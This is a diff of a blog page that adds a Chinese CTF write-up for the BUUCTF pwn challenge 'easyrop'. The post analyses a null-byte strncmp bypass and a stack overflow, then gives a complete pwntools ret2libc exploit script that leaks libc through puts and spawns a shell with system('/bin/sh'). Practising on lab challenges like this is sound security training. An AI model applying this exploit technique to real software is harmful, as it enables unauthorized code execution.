@@ -158,6 +158,143 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/06/13/buu-easyrop/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yang">
+      <meta itemprop="description" content="it is funny">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/06/13/buu-easyrop/" class="post-title-link" itemprop="url">buu-easyrop</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-06-13 16:44:40" itemprop="dateCreated datePublished" datetime="2021-06-13T16:44:40+08:00">2021-06-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-06-14 00:48:08" itemprop="dateModified" datetime="2021-06-14T00:48:08+08:00">2021-06-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/buu/" itemprop="url" rel="index"><span itemprop="name">buu</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/buu/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><p><img src="/2021/06/13/buu-easyrop/ida.png"></p>
+<ol>
+<li>main函数中生成4位的随机数写入变量buf中，传入函数inputcomp()（自行重命名）</li>
+</ol>
+<p><img src="/2021/06/13/buu-easyrop/inputcomp.png"></p>
+<ol start="2">
+<li><p>函数inputcomp()将传入的随机数写入数组s，接收用户输入存入buf中，<code>用strlen()读取buf字符串的长度</code>，并以此长度用函数strncmp()比较字符串buf和s，若不相同则退出程序；若相同则返回buf的第八字节。</p>
+<blockquote>
+<p>此处要绕过字符串的比较，因为无法获取生成的随机数的值。只要将buf第一个字节设置为’\x00’（字符串终止符）即可让strlen()函数得出的长度为零，此时strncmp()比较两个字符串的前零位，恒相等。绕过比较后便可随意控制buf[7]的值</p>
+</blockquote>
+</li>
+<li><p>将函数inputcomp()返回的值传入main中最后一个函数中，如果传入的值不等于’\x7f’，系统便以传入的值为读取上限来读取用户输入并存入buf中。</p>
+<blockquote>
+<p>此处为溢出点</p>
+</blockquote>
+</li>
+</ol>
+<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol>
+<li>绕过字符串比较，控制buf[7]的值。</li>
+<li>在第二个函数中进行溢出，构造rop链，通过puts函数泄露出read函数的地址并返回至main函数，从而泄露出libc基地址并为第二次溢出做准备。</li>
+<li>重复步骤一</li>
+<li>通过libc的基地址找出system和”/bin/sh”的地址，再次进行溢出，构造rop链，执行system(“/bin/sh”)</li>
+</ol>
+<h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&quot;debug&quot;</span></span><br><span class="line">sh=process([<span class="string">&#x27;./pwn&#x27;</span>],env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc-2.23.so&quot;</span>&#125;)</span><br><span class="line"><span class="comment"># main=0x08048825</span></span><br><span class="line"><span class="comment"># sh=remote(&quot;node3.buuoj.cn&quot;,28268)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">puts=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main=<span class="number">0x08048825</span></span><br><span class="line">payload=<span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">6</span>+<span class="string">&#x27;\xff&#x27;</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;Correct\n&quot;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">&#x27;e&#x27;</span>*<span class="number">4</span>+p32(puts)+p32(main)+p32(read_got)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">read=u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">libc_base=read-libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh=libc_base+libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">payload=<span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">6</span>+<span class="string">&#x27;\xff&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system))</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">&#x27;e&#x27;</span>*<span class="number">4</span>+p32(system)+<span class="string">&quot;a&quot;</span>*<span class="number">4</span>+p32(binsh)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="相关函数和构造参数详解"><a href="#相关函数和构造参数详解" class="headerlink" title="相关函数和构造参数详解"></a>相关函数和构造参数详解</h1><h2 id="open"><a href="#open" class="headerlink" title="open()"></a>open()</h2><p>open()的原型为</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int open(const char *path, int oflags);</span><br><span class="line">int open(const char *path, int oflags, mode_t mode);</span><br></pre></td></tr></table></figure>
+
+<p>path，是包括路径的完整文件名，oflags是文件访问模式（即是什么方式打开文件，只读、只写还是可读并可写等），mode用于设定文件的访问权限。</p>
+<p>open建立了一条到文件或设备的访问路径，如果调用成功，返回一个可以被read、write等其他系统调用的函数使用的文件描述符，而且这个文件描述是唯一的，不与任何其他运行中的进程共享，在失败时返回-1，并设置全局变量errno来指明失明的原因。</p>
+<h3 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h3><p>文件描述符是一些小数值，你可以通过它们访问的打开的文件设备，而有多少文件描述符可用取决于系统的配置情况。但是当一个程序开始运行时，它一般会有3个已经打开的文件描述符，就是</p>
+<p>0：标准输入</p>
+<p>1：标准输出</p>
+<p>2：标准错误</p>
+<p>那些数学（即0、1、2）就是文件描述符，因为在Linux上一切都是文件，所以标准输入（stdin），标准输出（stdout）和标准错误（stderr）也可看作文件来对待</p>
+<h2 id="read"><a href="#read" class="headerlink" title="read()"></a>read()</h2><p>read()的原型为</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">size_t <span class="built_in">read</span>(int fildes, void *buf, size_t nbytes);</span><br></pre></td></tr></table></figure>
+
+<p>read系统调用的作用是从与文件描述符相关的文件里读入nbytes个字节的数据，并把它们放到数据区buf中，返回读入的字节数，失败时返回-1。</p>
+<p>当文件描述符为0时，从标准输入读取数据。</p>
+<h2 id="strncmp"><a href="#strncmp" class="headerlink" title="strncmp()"></a>strncmp()</h2><p>strncmp()函数原型为</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int strncmp(const char *str1, const char *str2, size_t n)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>C 库函数 <strong>int strncmp(const char *str1, const char *str2, size_t n)</strong> 把 <strong>str1</strong> 和 <strong>str2</strong> 进行比较，最多比较前 <strong>n</strong> 个字节。如果str1&lt;str2，则返回值&lt;0，如果str1&gt;str2，则返回值&gt;0，如果str1=str2，则返回值=0</p>
+<h2 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h2><p>system()原型</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int system(const char *<span class="built_in">command</span>);</span><br></pre></td></tr></table></figure>
+
+<p>如果无法启动shell运行命令，system将返回127；出现不能执行system调用的其他错误时返回-1。如果system能够顺利执行，返回那个命令的退出码。</p>
+<h2 id="32位传参"><a href="#32位传参" class="headerlink" title="32位传参"></a>32位传参</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push args</span><br><span class="line">call func</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>将要使用的参数从右向左依次压入栈</li>
+<li>将返回地址压入栈</li>
+<li>将bp压入栈</li>
+<li>函数执行</li>
+</ol>
+<p>若直接劫持栈中的返回地址N为某个函数的地址，该返回地址N后面的四位为该函数的返回地址M，返回地址M后面的数据才是该函数的参数。</p>
+<p><img src="/2021/06/13/buu-easyrop/stack.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/06/13/%E6%A0%A1%E8%B5%9B-fmt/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -495,20 +632,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-count">14</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-count">11</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-count">13</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
